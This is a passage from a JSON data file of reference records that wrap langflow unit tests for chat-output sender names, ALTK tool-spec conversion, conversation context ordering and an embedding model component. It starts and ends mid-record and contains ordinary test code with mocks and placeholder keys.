chat_output2]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        # Should return the first one found\\n        assert result == \\\"Assistant1\\\"\\n\\n    def test_get_chat_output_sender_name_missing_sender_name(self):\\n        \\\"\\\"\\\"Test that function returns None when ChatOutput has no sender_name parameter.\\\"\\\"\\\"\\n        # Create a mock ChatOutput vertex without sender_name\\n        chat_output_vertex = Mock()\\n        chat_output_vertex.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        chat_output_vertex.raw_params = {\\\"other_param\\\": \\\"value\\\"}  # No sender_name\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [chat_output_vertex]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result is None\\n\\n    def test_get_chat_output_sender_name_empty_sender_name(self):\\n        \\\"\\\"\\\"Test that function returns empty string when sender_name is empty.\\\"\\\"\\\"\\n        # Create a mock ChatOutput vertex with empty sender_name\\n        chat_output_vertex = Mock()\\n        chat_output_vertex.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        chat_output_vertex.raw_params = {\\\"sender_name\\\": \\\"\\\"}\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [chat_output_vertex]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result == \\\"\\\"\\n\\n    def test_get_chat_output_sender_name_none_sender_name(self):\\n        \\\"\\\"\\\"Test that function returns None when sender_name is None.\\\"\\\"\\\"\\n        # Create a mock ChatOutput vertex with None sender_name\\n        chat_output_vertex = Mock()\\n        chat_output_vertex.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        chat_output_vertex.raw_params = {\\\"sender_name\\\": None}\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [chat_output_vertex]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result is None\\n\\n    def test_get_chat_output_sender_name_vertex_missing_data(self):\\n        \\\"\\\"\\\"Test that function handles vertex without data attribute gracefully.\\\"\\\"\\\"\\n        # Create a mock vertex without data attribute\\n        bad_vertex = Mock()\\n        del bad_vertex.data  # Remove data attribute\\n\\n        # Create a good ChatOutput vertex\\n        good_vertex = Mock()\\n        good_vertex.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        good_vertex.raw_params = {\\\"sender_name\\\": \\\"Assistant\\\"}\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [bad_vertex, good_vertex]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        # Should still find the good vertex\\n        assert result == \\\"Assistant\\\"\\n\\n    def test_get_chat_output_sender_name_vertex_missing_raw_params(self):\\n        \\\"\\\"\\\"Test that function handles vertex without raw_params attribute gracefully.\\\"\\\"\\\"\\n        # Create a mock ChatOutput vertex without raw_params\\n        chat_output_vertex = Mock()\\n        chat_output_vertex.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        del chat_output_vertex.raw_params  # Remove raw_params attribute\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [chat_output_vertex]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result is None\\n\\n    def test_get_chat_output_sender_name_case_sensitivity(self):\\n        \\\"\\\"\\\"Test that function is case sensitive for component type matching.\\\"\\\"\\\"\\n        # Create vertices with different case variations\\n        vertex1 = Mock()\\n        vertex1.data = {\\\"type\\\": \\\"chatoutput\\\"}  # lowercase\\n        vertex1.raw_params = {\\\"sender_name\\\": \\\"Assistant1\\\"}\\n\\n        vertex2 = Mock()\\n        vertex2.data = {\\\"type\\\": \\\"CHATOUTPUT\\\"}  # uppercase\\n        vertex2.raw_params = {\\\"sender_name\\\": \\\"Assistant2\\\"}\\n\\n        vertex3 = Mock()\\n        vertex3.data = {\\\"type\\\": \\\"ChatOutput\\\"}  # correct case\\n        vertex3.raw_params = {\\\"sender_name\\\": \\\"Assistant3\\\"}\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [vertex1, vertex2, vertex3]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        # Should only match exact case \\\"ChatOutput\\\"\\n        assert result == \\\"Assistant3\\\"\\n\\n    def test_get_chat_output_sender_name_complex_graph(self):\\n        \\\"\\\"\\\"Test function with a complex graph containing multiple component types.\\\"\\\"\\\"\\n        # Create various component types\\n        chat_input = Mock()\\n        chat_input.data = {\\\"type\\\": \\\"ChatInput\\\"}\\n        chat_input.raw_params = {\\\"value\\\": \\\"Hello\\\"}\\n\\n        text_output = Mock()\\n        text_output.data = {\\\"type\\\": \\\"TextOutput\\\"}\\n        text_output.raw_params = {\\\"value\\\": \\\"World\\\"}\\n\\n        agent = Mock()\\n        agent.data = {\\\"type\\\": \\\"Agent\\\"}\\n        agent.raw_params = {\\\"system_prompt\\\": \\\"You are helpful\\\"}\\n\\n        chat_output = Mock()\\n        chat_output.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        chat_output.raw_params = {\\\"sender_name\\\": \\\"AI Assistant\\\", \\\"should_store_message\\\": True}\\n\\n        llm = Mock()\\n        llm.data = {\\\"type\\\": \\\"OpenAI\\\"}\\n        llm.raw_params = {\\\"model_name\\\": \\\"gpt-4\\\"}\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [chat_input, text_output, agent, chat_output, llm]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result == \\\"AI Assistant\\\"\\n\\n    def test_get_chat_output_sender_name_integration_with_agent(self):\\n        \\\"\\\"\\\"Test integration with agent component showing how it would be used.\\\"\\\"\\\"\\n        # Create a mock agent component\\n        agent_component = Mock()\\n\\n        # Create a mock graph with ChatOutput\\n        chat_output_vertex = Mock()\\n        chat_output_vertex.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        chat_output_vertex.raw_params = {\\\"sender_name\\\": \\\"My Custom Agent\\\", \\\"should_store_message\\\": True, \\\"sender\\\": \\\"AI\\\"}\\n\\n        agent_component.graph = Mock()\\n        agent_component.graph.vertices = [chat_output_vertex]\\n\\n        # Test the function as it would be used in the agent\\n        result = get_chat_output_sender_name(agent_component)\\n\\n        # This simulates the usage in agent.py:\\n        # sender_name = get_chat_output_sender_name(self) or self.display_name or \\\"Agent\\\"\\n        agent_component.display_name = \\\"Default Agent Name\\\"\\n        final_sender_name = result or agent_component.display_name or \\\"Agent\\\"\\n\\n        assert result == \\\"My Custom Agent\\\"\\n        assert final_sender_name == \\\"My Custom Agent\\\"\\n\\n    def test_get_chat_output_sender_name_integration_fallback(self):\\n        \\\"\\\"\\\"Test integration showing fallback behavior when no ChatOutput found.\\\"\\\"\\\"\\n        # Create a mock agent component without ChatOutput\\n        agent_component = Mock()\\n        agent_component.display_name = \\\"My Agent\\\"\\n\\n        # Create a mock graph without ChatOutput\\n        other_vertex = Mock()\\n        other_vertex.data = {\\\"type\\\": \\\"ChatInput\\\"}\\n        other_vertex.raw_params = {\\\"value\\\": \\\"Hello\\\"}\\n\\n        agent_component.graph = Mock()\\n        agent_component.graph.vertices = [other_vertex]\\n\\n        # Test the function\\n        result = get_chat_output_sender_name(agent_component)\\n\\n        # Simulate the fallback logic used in agent.py\\n        final_sender_name = result or agent_component.display_name or \\\"Agent\\\"\\n\\n        assert result is None\\n        assert final_sender_name == \\\"My Agent\\\"\\n\"},{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_altk_agent_tool_conversion.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"ca22a75a08162757ba40113fb64eaf417087169b6f8f159061a5516bb671b97f\",\"content\":\"import pytest\\n\\ntry:\\n    import altk  # noqa: F401\\nexcept ImportError:\\n    # agent-lifecycle-toolkit is an optional extra (langflow-base[altk]); skip if\\n    # not installed. (Upstream dropped its <3.14 cap in 0.10.1, now requires >=3.10.)\\n    pytest.skip(\\\"altk (agent-lifecycle-toolkit) not available\\\", allow_module_level=True)\\n\\nfrom langchain_core.tools import BaseTool\\nfrom lfx.base.agents.altk_tool_wrappers import PreToolValidationWrapper\\nfrom lfx.log.logger import logger\\nfrom pydantic import BaseModel, Field\\n\\n\\nclass CustomSchemaExceptionError(Exception):\\n    \\\"\\\"\\\"Custom exception for schema errors.\\\"\\\"\\\"\\n\\n\\nclass MockBasicTool(BaseTool):\\n    name: str = \\\"test_tool\\\"\\n    description: str = \\\"A test tool\\\"\\n\\n    def _run(self, query: str):\\n        return f\\\"Running with {query}\\\"\\n\\n    def _arun(self, query: str):\\n        error_message = \\\"async not implemented\\\"\\n        raise NotImplementedError(error_message)\\n\\n\\nclass MockNoParamTool(BaseTool):\\n    name: str = \\\"no_param_tool\\\"\\n    description: str = \\\"A tool with no parameters\\\"\\n\\n    def _run(self):\\n        return \\\"Running with no params\\\"\\n\\n    def _arun(self):\\n        error_message = \\\"async not implemented\\\"\\n        raise NotImplementedError(error_message)\\n\\n\\nclass UrlSchema(BaseModel):\\n    \\\"\\\"\\\"Schema for the fetch_content tool's parameters.\\\"\\\"\\\"\\n\\n    urls: list[str] | None = Field(\\n        default=None, description=\\\"Enter one or more URLs to crawl recursively, by clicking the '+' button.\\\"\\n    )\\n\\n\\nclass MockToolWithSchema(BaseTool):\\n    name: str = \\\"fetch_content\\\"\\n    description: str = \\\"Fetch content from one or more web pages, following links recursively.\\\"\\n    args_schema: type[BaseModel] = UrlSchema\\n\\n    def _run(self, _urls: list[str] | None = None):\\n        return \\\"Fetched content\\\"\\n\\n    def _arun(self, urls: list[str] | None = None):\\n        error_message = \\\"async not implemented\\\"\\n        raise NotImplementedError(error_message)\\n\\n\\ndef test_basic_tool_conversion():\\n    \\\"\\\"\\\"Test conversion of a basic tool without explicit schema but with method parameters.\\\"\\\"\\\"\\n    tool = MockBasicTool()\\n    result = PreToolValidationWrapper.convert_langchain_tools_to_sparc_tool_specs_format([tool])\\n\\n    assert len(result) == 1\\n    tool_spec = result[0]\\n    assert tool_spec[\\\"type\\\"] == \\\"function\\\"\\n    assert tool_spec[\\\"function\\\"][\\\"name\\\"] == \\\"test_tool\\\"\\n    assert tool_spec[\\\"function\\\"][\\\"description\\\"] == \\\"A test tool\\\"\\n    # LangChain automatically extracts parameters from _run method signature\\n    assert tool_spec[\\\"function\\\"][\\\"parameters\\\"] == {\\n        \\\"type\\\": \\\"object\\\",\\n        \\\"properties\\\": {\\\"query\\\": {\\\"type\\\": \\\"string\\\", \\\"description\\\": \\\"\\\"}},\\n        \\\"required\\\": [],\\n    }\\n\\n\\ndef test_no_param_tool_conversion():\\n    \\\"\\\"\\\"Test conversion of a tool with no parameters.\\\"\\\"\\\"\\n    tool = MockNoParamTool()\\n    result = PreToolValidationWrapper.convert_langchain_tools_to_sparc_tool_specs_format([tool])\\n\\n    assert len(result) == 1\\n    tool_spec = result[0]\\n    assert tool_spec[\\\"type\\\"] == \\\"function\\\"\\n    assert tool_spec[\\\"function\\\"][\\\"name\\\"] == \\\"no_param_tool\\\"\\n    assert tool_spec[\\\"function\\\"][\\\"description\\\"] == \\\"A tool with no parameters\\\"\\n    # Tool with no parameters should have empty properties\\n    assert tool_spec[\\\"function\\\"][\\\"parameters\\\"] == {\\\"type\\\": \\\"object\\\", \\\"properties\\\": {}, \\\"required\\\": []}\\n\\n\\ndef test_tool_with_list_parameter():\\n    \\\"\\\"\\\"Test conversion of a tool with list parameter type.\\\"\\\"\\\"\\n    tool = MockToolWithSchema()\\n\\n    # First validate that the tool has the correct schema before conversion\\n    assert hasattr(tool, \\\"args_schema\\\"), \\\"Tool should have args_schema\\\"\\n    schema_model = tool.args_schema\\n    assert issubclass(schema_model, BaseModel), \\\"Schema should be a Pydantic model\\\"\\n\\n    # Check the schema field using Pydantic v2 model_fields\\n    schema_fields = schema_model.model_fields\\n    assert \\\"urls\\\" in schema_fields, \\\"Schema should have urls field\\\"\\n    urls_field = schema_fields[\\\"urls\\\"]\\n\\n    # Check that the field is properly configured\\n    assert not urls_field.is_required(), \\\"urls field should be optional\\\"\\n    assert urls_field.description == \\\"Enter one or more URLs to crawl recursively, by clicking the '+' button.\\\"\\n\\n    # Now test the conversion\\n    result = PreToolValidationWrapper.convert_langchain_tools_to_sparc_tool_specs_format([tool])\\n\\n    assert len(result) == 1\\n    tool_spec = result[0]\\n\\n    # Check basic structure\\n    assert tool_spec[\\\"type\\\"] == \\\"function\\\", \\\"Incorrect type\\\"\\n    assert tool_spec[\\\"function\\\"][\\\"name\\\"] == \\\"fetch_content\\\", \\\"Incorrect name\\\"\\n    assert (\\n        tool_spec[\\\"function\\\"][\\\"description\\\"] == \\\"Fetch content from one or more web pages, following links recursively.\\\"\\n    ), \\\"Incorrect description\\\"\\n\\n    # Check parameters structure\\n    params = tool_spec[\\\"function\\\"][\\\"parameters\\\"]\\n    assert params[\\\"type\\\"] == \\\"object\\\", \\\"Parameters should be an object\\\"\\n    assert \\\"properties\\\" in params, \\\"Parameters should have properties\\\"\\n    assert isinstance(params[\\\"properties\\\"], dict), \\\"Properties should be a dictionary\\\"\\n\\n    # Check the urls parameter specifically\\n    assert \\\"urls\\\" in params[\\\"properties\\\"], \\\"urls parameter is missing\\\"\\n    urls_spec = params[\\\"properties\\\"][\\\"urls\\\"]\\n    logger.debug(\\\"Generated URLs spec: %s\\\", urls_spec)  # Debug print\\n\\n    # Now it should correctly identify as array type\\n    assert urls_spec[\\\"type\\\"] == \\\"array\\\", \\\"urls type should be array\\\"\\n    assert urls_spec[\\\"description\\\"] == \\\"Enter one or more URLs to crawl recursively, by clicking the '+' button.\\\", (\\n        \\\"Incorrect urls description\\\"\\n    )\\n\\n    # Should have items specification\\n    assert \\\"items\\\" in urls_spec, \\\"Array should have items specification\\\"\\n    assert urls_spec[\\\"items\\\"][\\\"type\\\"] == \\\"string\\\", \\\"Array items should be strings\\\"\\n\\n    # Should have default value since it's optional\\n    assert urls_spec.get(\\\"default\\\") is None, \\\"Should have default None value\\\"\\n\\n    # Since urls is optional, it should not be in required list\\n    assert \\\"required\\\" in params, \\\"Parameters should have required field\\\"\\n    assert isinstance(params[\\\"required\\\"], list), \\\"Required should be a list\\\"\\n    assert \\\"urls\\\" not in params[\\\"required\\\"], \\\"urls should not be in required list\\\"\\n\\n\\ndef test_multiple_tools_conversion():\\n    \\\"\\\"\\\"Test conversion of multiple tools at once.\\\"\\\"\\\"\\n    tools = [MockBasicTool(), MockToolWithSchema()]\\n    result = PreToolValidationWrapper.convert_langchain_tools_to_sparc_tool_specs_format(tools)\\n\\n    assert len(result) == 2\\n\\n    # Check first tool (basic)\\n    basic_spec = result[0]\\n    assert basic_spec[\\\"function\\\"][\\\"name\\\"] == \\\"test_tool\\\"\\n    # Basic tool should have query parameter as string\\n    assert \\\"query\\\" in basic_spec[\\\"function\\\"][\\\"parameters\\\"][\\\"properties\\\"]\\n    assert basic_spec[\\\"function\\\"][\\\"parameters\\\"][\\\"properties\\\"][\\\"query\\\"][\\\"type\\\"] == \\\"string\\\"\\n\\n    # Check second tool (with schema)\\n    schema_spec = result[1]\\n    assert schema_spec[\\\"function\\\"][\\\"name\\\"] == \\\"fetch_content\\\"\\n    assert \\\"urls\\\" in schema_spec[\\\"function\\\"][\\\"parameters\\\"][\\\"properties\\\"]\\n    # Now correctly identifies as array\\n    assert schema_spec[\\\"function\\\"][\\\"parameters\\\"][\\\"properties\\\"][\\\"urls\\\"][\\\"type\\\"] == \\\"array\\\"\\n    assert schema_spec[\\\"function\\\"][\\\"parameters\\\"][\\\"properties\\\"][\\\"urls\\\"][\\\"items\\\"][\\\"type\\\"] == \\\"string\\\"\\n\\n\\nclass BrokenTool(BaseTool):\\n    name: str = \\\"broken_tool\\\"\\n    description: str = \\\"A tool that will cause conversion errors\\\"\\n\\n    @property\\n    def args_schema(self):\\n        error_message = \\\"Schema Error\\\"\\n        raise CustomSchemaExceptionError(error_message)\\n\\n    def _run(self):\\n        pass\\n\\n\\ndef test_error_handling():\\n    \\\"\\\"\\\"Test handling of errors during conversion.\\\"\\\"\\\"\\n    tool = BrokenTool()\\n    result = PreToolValidationWrapper.convert_langchain_tools_to_sparc_tool_specs_format([tool])\\n\\n    assert len(result) == 1\\n    tool_spec = result[0]\\n\\n    # Should create minimal spec when error occurs\\n    assert tool_spec[\\\"type\\\"] == \\\"function\\\"\\n    assert tool_spec[\\\"function\\\"][\\\"name\\\"] == \\\"broken_tool\\\"\\n    assert \\\"parameters\\\" in tool_spec[\\\"function\\\"]\\n    assert tool_spec[\\\"function\\\"][\\\"parameters\\\"] == {\\\"type\\\": \\\"object\\\", \\\"properties\\\": {}, \\\"required\\\": []}\\n\\n\\ndef test_complex_schema_conversion():\\n    \\\"\\\"\\\"Test conversion of tools with complex parameter schemas.\\\"\\\"\\\"\\n    from pydantic import BaseModel, Field\\n\\n    class ComplexSchema(BaseModel):\\n        required_str: str = Field(description=\\\"A required string parameter\\\")\\n        optional_int: int | None = Field(default=None, description=\\\"An optional integer\\\")\\n        str_list: list[str] = Field(default_factory=list, description=\\\"A list of strings\\\")\\n\\n    class ComplexTool(BaseTool):\\n        name: str = \\\"complex_tool\\\"\\n        description: str = \\\"A tool with complex parameters\\\"\\n        args_schema: type[BaseModel] = ComplexSchema\\n\\n        def _run(self, **kwargs):\\n            logger.debug(f\\\"ComplexTool called with kwargs: {kwargs}\\\")\\n            return \\\"complex result\\\"\\n\\n    tool = ComplexTool()\\n    result = PreToolValidationWrapper.convert_langchain_tools_to_sparc_tool_specs_format([tool])\\n\\n    assert len(result) == 1\\n    tool_spec = result[0]\\n\\n    # Check that all parameters are properly converted\\n    props = tool_spec[\\\"function\\\"][\\\"parameters\\\"][\\\"properties\\\"]\\n\\n    # Required string parameter\\n    assert \\\"required_str\\\" in props\\n    assert props[\\\"required_str\\\"][\\\"type\\\"] == \\\"string\\\"\\n    assert props[\\\"required_str\\\"][\\\"description\\\"] == \\\"A required string parameter\\\"\\n\\n    # Optional integer parameter\\n    assert \\\"optional_int\\\" in props\\n    # Should handle the Union[int, None] properly\\n    assert props[\\\"optional_int\\\"][\\\"type\\\"] == \\\"integer\\\"\\n    assert props[\\\"optional_int\\\"][\\\"description\\\"] == \\\"An optional integer\\\"\\n\\n    # List parameter\\n    assert \\\"str_list\\\" in props\\n    assert props[\\\"str_list\\\"][\\\"type\\\"] == \\\"array\\\"\\n    assert props[\\\"str_list\\\"][\\\"description\\\"] == \\\"A list of strings\\\"\\n    assert props[\\\"str_list\\\"][\\\"items\\\"][\\\"type\\\"] == \\\"string\\\"\\n\\n    # Check required fields\\n    required = tool_spec[\\\"function\\\"][\\\"parameters\\\"][\\\"required\\\"]\\n    assert \\\"required_str\\\" in required\\n    assert \\\"optional_int\\\" not in required  # Should not be required\\n    assert \\\"str_list\\\" not in required  # Should not be required\\n\"},{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_conversation_context_ordering.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"eedba6d8c0b2a6f83297c9e998498bade655ea6912027ab67c4bff73fc2b3aec\",\"content\":\"\\\"\\\"\\\"Unit tests for conversation context ordering in agent components.\\n\\nThis test ensures that conversation context maintains proper chronological order\\n(oldest \u2192 newest \u2192 current input) rather than reverse ordering which breaks\\nSPARC tool validation and conversation flow understanding.\\n\\\"\\\"\\\"\\n\\nimport pytest\\n\\ntry:\\n    import altk  # noqa: F401\\nexcept ImportError:\\n    # agent-lifecycle-toolkit is an optional extra (langflow-base[altk]); skip if\\n    # not installed. (Upstream dropped its <3.14 cap in 0.10.1, now requires >=3.10.)\\n    pytest.skip(\\\"altk (agent-lifecycle-toolkit) not available\\\", allow_module_level=True)\\n\\nfrom langchain_core.messages import AIMessage, HumanMessage\\nfrom lfx.base.agents.altk_base_agent import ALTKBaseAgentComponent\\nfrom lfx.schema.message import Message\\n\\n\\nclass TestALTKAgentContextOrdering:\\n    \\\"\\\"\\\"Test conversation context ordering in ALTK agent components.\\\"\\\"\\\"\\n\\n    def test_conversation_context_chronological_order(self):\\n        \\\"\\\"\\\"Test that build_conversation_context maintains proper chronological order.\\n\\n        This test validates the fix for the conversation ordering bug where\\n        current input was being prepended to chat history instead of appended,\\n        causing reverse chronological order that broke SPARC validation.\\n        \\\"\\\"\\\"\\n        # Create test messages in chronological order\\n        chat_history = [\\n            Message(text=\\\"353454\\\", sender=\\\"User\\\", sender_name=\\\"User\\\"),  # oldest message\\n            Message(text=\\\"plus\\\", sender=\\\"AI\\\", sender_name=\\\"Assistant\\\"),  # middle message\\n            Message(text=\\\"confusion\\\", sender=\\\"User\\\", sender_name=\\\"User\\\"),  # newest message\\n        ]\\n        current_input = Message(text=\\\"what?\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")  # current input\\n\\n        # Create mock agent component\\n        class TestAgent(ALTKBaseAgentComponent):\\n            def __init__(self):\\n                self.input_value = current_input\\n                self.chat_history = chat_history\\n\\n        agent = TestAgent()\\n\\n        # Build conversation context\\n        context = agent.build_conversation_context()\\n\\n        # Extract message contents for validation\\n        contents = [msg.content for msg in context]\\n\\n        # Validate chronological order: oldest \u2192 middle \u2192 newest \u2192 current\\n        expected_order = [\\\"353454\\\", \\\"plus\\\", \\\"confusion\\\", \\\"what?\\\"]\\n        assert contents == expected_order, (\\n            f\\\"Conversation context not in chronological order. Expected: {expected_order}, Got: {contents}\\\"\\n        )\\n\\n        # Verify all messages are present\\n        assert len(context) == 4, f\\\"Expected 4 messages, got {len(context)}\\\"\\n\\n        # Verify message types based on original senders\\n        expected_types = [HumanMessage, AIMessage, HumanMessage, HumanMessage]  # User, AI, User, User\\n        for i, (msg, expected_type) in enumerate(zip(context, expected_types, strict=True)):\\n            assert isinstance(msg, expected_type), (\\n                f\\\"Message {i} has wrong type. Expected {expected_type.__name__}, got {type(msg).__name__}\\\"\\n            )\\n\\n    def test_conversation_context_empty_history(self):\\n        \\\"\\\"\\\"Test conversation context with empty chat history.\\\"\\\"\\\"\\n        current_input = Message(text=\\\"hello\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n\\n        class TestAgent(ALTKBaseAgentComponent):\\n            def __init__(self):\\n                self.input_value = current_input\\n                self.chat_history = []\\n\\n        agent = TestAgent()\\n        context = agent.build_conversation_context()\\n\\n        # Should only contain current input\\n        assert len(context) == 1\\n        assert context[0].content == \\\"hello\\\"\\n\\n    def test_conversation_context_no_current_input(self):\\n        \\\"\\\"\\\"Test conversation context with no current input.\\\"\\\"\\\"\\n        chat_history = [Message(text=\\\"old message\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")]\\n\\n        class TestAgent(ALTKBaseAgentComponent):\\n            def __init__(self):\\n                self.input_value = None\\n                self.chat_history = chat_history\\n\\n        agent = TestAgent()\\n        context = agent.build_conversation_context()\\n\\n        # Should only contain chat history\\n        assert len(context) == 1\\n        assert context[0].content == \\\"old message\\\"\\n\\n    def test_conversation_context_single_turn(self):\\n        \\\"\\\"\\\"Test conversation context in single-turn scenario.\\\"\\\"\\\"\\n        current_input = Message(text=\\\"single question\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n\\n        class TestAgent(ALTKBaseAgentComponent):\\n            def __init__(self):\\n                self.input_value = current_input\\n                self.chat_history = None\\n\\n        agent = TestAgent()\\n        context = agent.build_conversation_context()\\n\\n        # Should only contain current input\\n        assert len(context) == 1\\n        assert context[0].content == \\\"single question\\\"\\n\\n    def test_conversation_context_multi_turn_regression(self):\\n        \\\"\\\"\\\"Regression test for multi-turn conversation ordering bug.\\n\\n        This test specifically validates that the bug where SPARC validation\\n        received messages in [newest, oldest, middle] order is fixed.\\n        \\\"\\\"\\\"\\n        # Simulate the exact scenario that was failing\\n        chat_history = [\\n            Message(text=\\\"353454\\\", sender=\\\"User\\\", sender_name=\\\"User\\\"),\\n            Message(text=\\\"plus\\\", sender=\\\"AI\\\", sender_name=\\\"Assistant\\\"),\\n            Message(text=\\\"confusion\\\", sender=\\\"User\\\", sender_name=\\\"User\\\"),\\n        ]\\n        current_input = Message(text=\\\"what?\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n\\n        class TestAgent(ALTKBaseAgentComponent):\\n            def __init__(self):\\n                self.input_value = current_input\\n                self.chat_history = chat_history\\n\\n        agent = TestAgent()\\n        context = agent.build_conversation_context()\\n        contents = [msg.content for msg in context]\\n\\n        # Verify the bug is fixed - should NOT be in reverse order\\n        buggy_order = [\\\"what?\\\", \\\"353454\\\", \\\"plus\\\", \\\"confusion\\\"]  # Old buggy behavior\\n        correct_order = [\\\"353454\\\", \\\"plus\\\", \\\"confusion\\\", \\\"what?\\\"]  # Expected behavior\\n\\n        assert contents != buggy_order, \\\"Bug regression: context in reverse order!\\\"\\n        assert contents == correct_order, f\\\"Expected {correct_order}, got {contents}\\\"\\n\"},{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_embedding_model_component.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"35a2d35dc092a6ca662a7a74cd8c6e598ad039729ba405ff0c5ff988577ffeb1\",\"content\":\"from unittest.mock import MagicMock, patch\\n\\nimport pytest\\nfrom lfx.components.models_and_agents import EmbeddingModelComponent\\n\\nfrom tests.base import ComponentTestBaseWithoutClient\\n\\n\\nclass TestEmbeddingModelComponent(ComponentTestBaseWithoutClient):\\n    @pytest.fixture\\n    def component_class(self):\\n        return EmbeddingModelComponent\\n\\n    @pytest.fixture\\n    def default_kwargs(self):\\n        return {\\n            \\\"model\\\": [\\n                {\\n                    \\\"name\\\": \\\"text-embedding-3-small\\\",\\n                    \\\"provider\\\": \\\"OpenAI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"embedding_class\\\": \\\"OpenAIEmbeddings\\\",\\n                        \\\"param_mapping\\\": {\\n                            \\\"model\\\": \\\"model\\\",\\n                            \\\"api_key\\\": \\\"api_key\\\",\\n                            \\\"api_base\\\": \\\"base_url\\\",\\n                            \\\"dimensions\\\": \\\"dimensions\\\",\\n                            \\\"chunk_size\\\": \\\"chunk_size\\\",\\n                            \\\"request_timeout\\\": \\\"request_timeout\\\",\\n                            \\\"max_retries\\\": \\\"max_retries\\\",\\n                            \\\"show_progress_bar\\\": \\\"show_progress_bar\\\",\\n                            \\\"model_kwargs\\\": \\\"model_kwargs\\\",\\n                        },\\n                    },\\n                }\\n            ],\\n            \\\"api_key\\\": \\\"test-api-key\\\",\\n            \\\"chunk_size\\\": 1000,\\n            \\\"max_retries\\\": 3,\\n            \\\"show_progress_bar\\\": False,\\n        }\\n\\n    @pytest.fixture\\n    def file_names_mapping(self):\\n        \\\"\\\"\\\"Return the file names mapping for version-specific files.\\\"\\\"\\\"\\n        return []\\n\\n    @patch(\\\"lfx.components.models_and_agents.embedding_model.get_embeddings\\\")\\n    def test_build_embeddings_openai(self, mock_get_embeddings, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that build_embeddings delegates to get_embeddings with correct kwargs.\\\"\\\"\\\"\\n        mock_instance = MagicMock()\\n        mock_get_embeddings.return_value = mock_instance\\n\\n        component = component_class(**default_kwargs)\\n        component._user_id = \\\"test-user-id\\\"\\n        component.api_key = \\\"test-key\\\"\\n        component.chunk_size = 1000\\n        component.max_retries = 3\\n        component.show_progress_bar = False\\n        component.api_base = None\\n        component.dimensions = None\\n        component.request_timeout = None\\n        component.model_kwargs = None\\n\\n        result = component.build_embeddings()\\n\\n        # Verify get_embeddings was called with correct parameters\\n        mock_get_embeddings.assert_called_once()\\n        call_kwargs = mock_get_embeddings.call_args.kwargs\\n        assert call_kwargs[\\\"api_key\\\"] == \\\"test-key\\\"\\n        assert call_kwargs[\\\"chunk_size\\\"] == 1000\\n        assert call_kwargs[\\\"max_retries\\\"] == 3\\n        assert call_kwargs[\\\"show_progress_bar\\\"] is False\\n        assert call_kwargs[\\\"model\\\"][0][\\\"name\\\"] == \\\"text-embedding-3-small\\\"\\n        assert call_kwargs[\\\"model\\\"][0][\\\"provider\\\"] == \\\"OpenAI\\\"\\n\\n        # Result should be whatever get_embeddings returns\\n        assert result == mock_instance\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_api_key_for_provider\\\")\\n    def test_build_embeddings_openai_missing_api_key(self, mock_get_api_key, component_class, default_kwargs):\\n        # Setup mock to return None (no API key)\\n        mock_get_api_key.return_value = None\\n\\n        component = component_class(**default_kwargs)\\n        component._user_id = \\\"test-user-id\\\"\\n        component.api_key = None\\n\\n        with pytest.raises(ValueError, match=\\\"OpenAI API key is required\\\"):\\n            component.build_embeddings()\\n\\n    def test_build_embeddings_invalid_model_format(self, component_class, default_kwargs):\\n        component = component_class(**default_kwargs)\\n        component.model = None\\n\\n        with pytest.raises(ValueError, match=\\\"An embedding model selection is required\\\"):\\n            component.build_embeddings()\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_api_key_for_provider\\\")\\n    @patch(\\\"lfx.base.models.unified_models.get_embedding_class\\\")\\n    def test_build_embeddings_unknown_embedding_class(\\n        self, mock_get_embedding_class, mock_get_api_key, component_class, default_kwargs\\n    ):\\n        # Setup mock for get_api_key_for_provider\\n        mock_get_api_key.return_value = \\\"test-key\\\"\\n        # Setup mock to raise ValueError for unknown class\\n        mock_get_embedding_class.side_effect = ValueError(\\\"Unknown embedding class: UnknownEmbeddingClass\\\")\\n\\n        component = component_class(**default_kwargs)\\n        component._user_id = \\\"test-user-id\\\"\\n        component.model = [\\n            {\\n                \\\"name\\\": \\\"unknown-model\\\",\\n                